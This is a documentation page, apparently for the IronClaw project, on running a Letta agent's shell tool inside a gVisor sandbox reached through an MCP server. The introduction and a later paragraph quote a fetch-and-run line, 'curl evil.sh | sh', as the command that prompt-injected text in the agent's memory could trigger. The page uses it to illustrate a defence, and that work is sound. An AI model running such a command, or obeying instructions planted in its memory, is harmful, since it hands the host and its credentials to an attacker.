---
title: "Sandbox your Letta agent with IronClaw"
description: How to sandbox a Letta (MemGPT) agent. Letta agents call model-chosen tools that run untrusted code; route that execution through IronClaw's MCP server so it runs inside a sealed gVisor sandbox instead of your host, the model key held host-side and every call gated, plus a credential-free demo you can run first.
---

# Sandbox your Letta agent with IronClaw

You built a stateful agent with **[Letta](https://github.com/letta-ai/letta)**
(formerly MemGPT): a persona, long-term memory, and tools the model can call.
Letta is a great way to give an agent *memory that persists*. The problem starts
when a tool runs somewhere real: a shell or code tool executes model-chosen
commands, and if you register it as an ordinary Python tool it runs with your
privileges, your filesystem, and unrestricted outbound network. One
prompt-injected instruction inside a document the agent remembers and reads back,
and that same tool runs `import os; os.system("curl evil.sh | sh")`.

IronClaw is the **security-hardened** option: the model-chosen command runs behind
a sealed sandbox under **gVisor (runsc)** with no network card, the model key held
**host-side** and never in the agent, and every privileged action gated and
audited.

!!! example "Runnable example"
    A one-command Letta to IronClaw example lives at
    [`examples/integrations/letta`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/letta):
    a Letta client-side tool whose execution is backed by an IronClaw sandbox, with
    a battery of blocked escape attempts printed at the end. The credential-free
    demo below runs the same sealed loop today.

## The fix: run the tool in IronClaw, not your host

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command or snippet inside an ephemeral, hardened box under **gVisor
(runsc)**: no network card, every Linux capability dropped, a non-root user, a
read-only root filesystem, and a restrictive seccomp profile. Letta has native MCP
support, so you attach the server and hand the agent its tool:

```python
from letta_client import Letta
from letta_client.types import StdioServerConfig

client = Letta(base_url="http://localhost:8283")

# Register IronClaw's MCP server (stdio) once.
client.tools.add_mcp_server(
    request=StdioServerConfig(server_name="ironclaw", command="ironctl", args=["mcp", "serve"])
)
tool = client.tools.add_mcp_tool(mcp_server_name="ironclaw", mcp_tool_name="sandbox_exec")

agent = client.agents.create(
    memory_blocks=[{"label": "persona", "value": "You run code only via sandbox_exec."}],
    tools=[tool.name],
)
```

The agent still chooses the tool call. It just can no longer run it on your box:
every command lands inside the sealed sandbox, so a poisoned memory that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical Letta tool that runs code:

```python
def run_shell(command: str) -> str:
    """Run a shell command and return its output.

    Args:
        command: The shell command to run.
    """
    import subprocess
    return subprocess.run(command, shell=True, capture_output=True, text=True).stdout

tool = client.tools.upsert_from_function(func=run_shell)   # runs the model's command for real
```

Three things are true of that tool, and all three are risks:

1. **The key is reachable.** Anything the command reads -- `os.environ`, a creds
   file -- is in scope.
2. **The code runs with your privileges.** A model-chosen command executes with
   your filesystem and network.
3. **Egress is wide open.** The command can reach any host on the internet.

Routing execution through `sandbox_exec` closes all three by construction, not by
convention.

## Client-side execution, if you prefer

Letta can also run a tool in *your* process instead of on the server: pass the
tool schema as `client_tools` and, when the model calls it, execute it yourself
and return the result. That is the honest home for a closure over a live IronClaw
sandbox handle, and it is exactly what the runnable example uses -- see
[`ironclaw_tool.py`](https://github.com/IronSecCo/ironclaw/blob/main/examples/integrations/letta/ironclaw_tool.py).

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from letta"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your LangChain agent](langchain.md) - the same MCP wiring for a
  LangChain agent.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
